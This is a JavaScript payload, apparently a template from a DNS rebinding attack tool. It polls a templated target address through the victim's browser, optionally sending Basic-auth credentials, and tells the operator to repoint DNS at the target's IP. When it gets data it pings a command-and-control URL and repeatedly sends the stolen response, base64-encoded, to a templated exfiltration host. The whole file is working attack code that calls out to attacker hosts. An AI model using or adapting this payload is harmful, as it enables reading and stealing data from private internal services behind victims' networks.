var log_area = document.getElementById("log");

function log(what) {
    log_area.textContent += what;
    log_area.scrollTop = log_area.scrollHeight;
}
log("Starting...")
log("\nPlease change the DNS record to point at your target's IP address.");


var target = "{{target}}";
var pingback = "{{pingback}}";
var exfil = "{{exfil}}";
var username = "{{username}}";
var password = "{{password}}";
var hello = "{{hello}}";
console.log(hello)
function poller() {
    // TODO remove for debug
    if (--counter == 0) {
        window.clearTimeout(keep_going);
        log("\nHave been waiting for too long. End of script.");
        return;
    }
    log(".");

    var r = new XMLHttpRequest();
    // using the date trick to prevent caching during debugging
    r.open("GET", target);
    console.log(r)
    r.addEventListener("error", function() {
        log("\nError reported");
    });
    r.withCredentials = true;
    if (username != "" && password != "") {
        r.setRequestHeader("Authorization", "Basic " + btoa(username + ":" + password));
    }
    console.log("hereeee");
    // when we get something
    r.onreadystatechange = function() { 
        console.log("INNN hereeee",r);
        if (this.readyState == 4 && this.status == 200 ) {
            log("\nGot data! Saving it in the bounty text area. Please change the DNS entry back to the original IP.");
            document.getElementById("bounty").textContent = this.responseText;
            // tell c&c we've got stuff
            var q = new XMLHttpRequest();
            q.open("GET", pingback);
            q.send();
            // don't make this a var
            storage = this.responseText;
            window.clearTimeout(keep_going);
            // reset counter for exfiltration
            counter = 60;
            // now try to exfiltrate
            var elsewhere = window.setInterval(function () {
                if (--counter == 0) {
                    window.clearTimeout(keep_going);
                    log("\nHave been waiting for too long. End of script.");
                    return;
                }
                log("-");
                var s = new XMLHttpRequest();
                s.open("GET", exfil + "?e=" + btoa(this.storage));
                s.onreadystatechange = function() {
                    if (this.readyState == 4 && this.status == 200 ) {
                        log("\nData successfully exfiltrated. " + this.responseText);
                        log("\nEnd of script.");
                        window.clearTimeout(elsewhere);
                        storage = "";
                    } else {
                        // log("\nCannot exfiltrate yet...");
                    }
                };
                s.send();
            }, 5000); // try to exfiltrate every 5s
            log("\nTrying to exfiltrate data...");
        } else {
            // no juice
        }
    };
    r.send();
}

// poll every 3s and up to `counter` times max
var counter = 60;
var keep_going = window.setInterval(poller, 3000);
log("\nPolling " + target);
if (username != "" && password != "") {
    log(" with credentials: " + username + ":" + password);
} else {
    log(" with no credentials.");
}
